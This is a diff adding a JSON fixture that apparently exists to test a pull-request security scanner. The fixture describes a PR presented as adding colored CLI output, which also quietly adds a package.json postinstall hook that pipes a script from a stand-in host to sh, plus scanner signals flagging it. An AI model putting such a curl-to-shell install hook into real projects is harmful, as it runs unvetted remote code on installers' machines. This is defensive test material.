@@ -1,0 +1,180 @@
+{
+  "schema_version": 1,
+  "kind": "bundle",
+  "run_id": 123456,
+  "run_attempt": 1,
+  "repository_id": 42,
+  "pr_number": 5,
+  "head_sha": "74953ab3d4de519e2023a243f21952ee2f26714b",
+  "base_repository_id": 42,
+  "base_ref": "main",
+  "base_tip_sha": "f496a9db7de905452e4e2e35eac6d4d6984a4ad3",
+  "merge_base_sha": "f496a9db7de905452e4e2e35eac6d4d6984a4ad3",
+  "status": "ok",
+  "payload": {
+    "pr": {
+      "repository": "OperationCode/eval-fixtures",
+      "repository_id": 42,
+      "number": 5,
+      "title": "Add colored CLI output",
+      "body": "Adds `oc-fixture-colorize` for colored log output, and a postinstall step that sets up the shared build tools.\n",
+      "author_login": "eval-author",
+      "author_association": "CONTRIBUTOR",
+      "labels": [],
+      "changed_files": 2
+    },
+    "files": [
+      {
+        "path": "package-lock.json",
+        "old_path": null,
+        "status": "modified",
+        "base_mode": "100644",
+        "head_mode": "100644",
+        "additions": 8,
+        "deletions": 1,
+        "base_blob_sha": "efc91fef89551f44d4e3d7633d973c18b96e387e",
+        "head_blob_sha": "fc79f4fba35989206302d40b7b83f439e9f180bf",
+        "binary": false,
+        "size": 652,
+        "coverage": "full",
+        "patch": "@@ -7,13 +7,20 @@\n     \"\": {\n       \"name\": \"demo\",\n       \"version\": \"1.0.0\",\n+      \"hasInstallScript\": true,\n       \"dependencies\": {\n-        \"left-pad\": \"^1.3.0\"\n+        \"left-pad\": \"^1.3.0\",\n+        \"oc-fixture-colorize\": \"1.2.0\"\n       }\n     },\n     \"node_modules/left-pad\": {\n       \"version\": \"1.3.0\",\n       \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\"\n+    },\n+    \"node_modules/oc-fixture-colorize\": {\n+      \"version\": \"1.2.0\",\n+      \"resolved\": \"https://registry.npmjs.org/oc-fixture-colorize/-/oc-fixture-colorize-1.2.0.tgz\",\n+      \"hasInstallScript\": true\n     }\n   }\n }\n",
+        "patch_redaction": "blob-context",
+        "content": "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"demo\",\n      \"version\": \"1.0.0\",\n      \"hasInstallScript\": true,\n      \"dependencies\": {\n        \"left-pad\": \"^1.3.0\",\n        \"oc-fixture-colorize\": \"1.2.0\"\n      }\n    },\n    \"node_modules/left-pad\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\"\n    },\n    \"node_modules/oc-fixture-colorize\": {\n      \"version\": \"1.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/oc-fixture-colorize/-/oc-fixture-colorize-1.2.0.tgz\",\n      \"hasInstallScript\": true\n    }\n  }\n}\n",
+        "head_content": "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"demo\",\n      \"version\": \"1.0.0\",\n      \"hasInstallScript\": true,\n      \"dependencies\": {\n        \"left-pad\": \"^1.3.0\",\n        \"oc-fixture-colorize\": \"1.2.0\"\n      }\n    },\n    \"node_modules/left-pad\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\"\n    },\n    \"node_modules/oc-fixture-colorize\": {\n      \"version\": \"1.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/oc-fixture-colorize/-/oc-fixture-colorize-1.2.0.tgz\",\n      \"hasInstallScript\": true\n    }\n  }\n}\n",
+        "base_content": "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"demo\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"left-pad\": \"^1.3.0\"\n      }\n    },\n    \"node_modules/left-pad\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\"\n    }\n  }\n}\n"
+      },
+      {
+        "path": "package.json",
+        "old_path": null,
+        "status": "modified",
+        "base_mode": "100644",
+        "head_mode": "100644",
+        "additions": 4,
+        "deletions": 2,
+        "base_blob_sha": "6ebb84e16f671acc42a31ad5c8c1ee1f6914e90f",
+        "head_blob_sha": "be827fba3c98f833b07450acfaaa7942c38ab33e",
+        "binary": false,
+        "size": 285,
+        "coverage": "full",
+        "patch": "@@ -3,9 +3,11 @@\n   \"version\": \"1.0.0\",\n   \"private\": true,\n   \"scripts\": {\n-    \"test\": \"node test/run.js\"\n+    \"test\": \"node test/run.js\",\n+    \"postinstall\": \"curl -fsSL https://setup.buildtools-cdn.example/install.sh | sh\"\n   },\n   \"dependencies\": {\n-    \"left-pad\": \"^1.3.0\"\n+    \"left-pad\": \"^1.3.0\",\n+    \"oc-fixture-colorize\": \"1.2.0\"\n   }\n }\n",
+        "patch_redaction": "blob-context",
+        "content": "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"private\": true,\n  \"scripts\": {\n    \"test\": \"node test/run.js\",\n    \"postinstall\": \"curl -fsSL https://setup.buildtools-cdn.example/install.sh | sh\"\n  },\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"oc-fixture-colorize\": \"1.2.0\"\n  }\n}\n",
+        "head_content": "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"private\": true,\n  \"scripts\": {\n    \"test\": \"node test/run.js\",\n    \"postinstall\": \"curl -fsSL https://setup.buildtools-cdn.example/install.sh | sh\"\n  },\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"oc-fixture-colorize\": \"1.2.0\"\n  }\n}\n",
+        "base_content": "{\n  \"name\": \"demo\",\n  \"version\": \"1.0.0\",\n  \"private\": true,\n  \"scripts\": {\n    \"test\": \"node test/run.js\"\n  },\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\"\n  }\n}\n"
+      }
+    ],
+    "dependency_delta": {
+      "changes": [
+        {
+          "path": "package-lock.json",
+          "ecosystem": "npm",
+          "name": "oc-fixture-colorize",
+          "old_versions": [],
+          "new_version": "1.2.0",
+          "source": {
+            "kind": "registry",
+            "normalized": "registry.npmjs.org/oc-fixture-colorize/-/oc-fixture-colorize-1.2.0.tgz",
+            "host": "registry.npmjs.org",
+            "official": true
+          },
+          "direct": true,
+          "has_install_script": true,
+          "registry": {
+            "published": "2026-02-10T14:30:00+00:00",
+            "install_scripts": {
+              "postinstall": "node scripts/setup.js"
+            },
+            "has_wheel": null
+          }
+        },
+        {
+          "path": "package.json",
+          "ecosystem": "npm",
+          "name": "oc-fixture-colorize",
+          "old_versions": [],
+          "new_version": "1.2.0",
+          "source": {
+            "kind": "registry",
+            "normalized": "registry.npmjs.org",
+            "host": "registry.npmjs.org",
+            "official": true
+          },
+          "direct": true,
+          "has_install_script": null,
+          "registry": {
+            "published": "2026-02-10T14:30:00+00:00",
+            "install_scripts": {
+              "postinstall": "node scripts/setup.js"
+            },
+            "has_wheel": null
+          }
+        }
+      ],
+      "new_global_sources": [],
+      "failures": []
+    },
+    "prefilter": {
+      "signals": [
+        {
+          "id": "package-json-install-script",
+          "level": "signal",
+          "detail": "install scripts changed: postinstall",
+          "file": "package.json",
+          "subject": null,
+          "lines": [],
+          "count": 1
+        },
+        {
+          "id": "dependency-install-script",
+          "level": "signal",
+          "detail": "lockfile entry has an install script",
+          "file": "package-lock.json",
+          "subject": "oc-fixture-colorize@1.2.0",
+          "lines": [],
+          "count": 1
+        },
+        {
+          "id": "dependency-install-script",
+          "level": "signal",
+          "detail": "registry manifest has install scripts: postinstall",
+          "file": "package-lock.json",
+          "subject": "oc-fixture-colorize@1.2.0",
+          "lines": [],
+          "count": 1
+        },
+        {
+          "id": "dependency-install-script",
+          "level": "signal",
+          "detail": "registry manifest has install scripts: postinstall",
+          "file": "package.json",
+          "subject": "oc-fixture-colorize@1.2.0",
+          "lines": [],
+          "count": 1
+        }
+      ],
+      "hard_blocks": []
+    },
+    "coverage": {
+      "trees_complete": true,
+      "files_in_comparison": 2,
+      "files_collected": 2,
+      "files": [
+        {
+          "path": "package-lock.json",
+          "coverage": "full",
+          "reason": null
+        },
+        {
+          "path": "package.json",
+          "coverage": "full",
+          "reason": null
+        }
+      ],
+      "complete": true
+    },
+    "size": {
+      "estimated_tokens": 1700,
+      "limit_tokens": 150000
+    }
+  }
+}
